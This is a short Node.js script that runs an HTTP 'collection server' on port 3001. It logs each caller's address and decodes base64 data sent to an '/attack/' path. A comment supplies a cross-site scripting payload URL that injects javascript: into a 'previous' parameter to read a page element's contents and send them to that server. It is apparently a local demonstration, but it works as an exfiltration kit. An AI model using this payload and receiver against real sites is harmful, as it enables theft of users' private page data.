require('http')
  .createServer((req, res) => {
    console.log(req.socket.remoteAddress,
      Buffer.from(req.url.split('/attack/')[1] || '', 'base64').toString('utf8').trim());
    res.end();
  })
  .listen(3001, () => { console.log('Collection server listening on http://localhost:3001') });

// Collects the datawhich can potentially be privileged information
// http://localhost:3000/?previous=javascript:(new%20Image()).src=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`
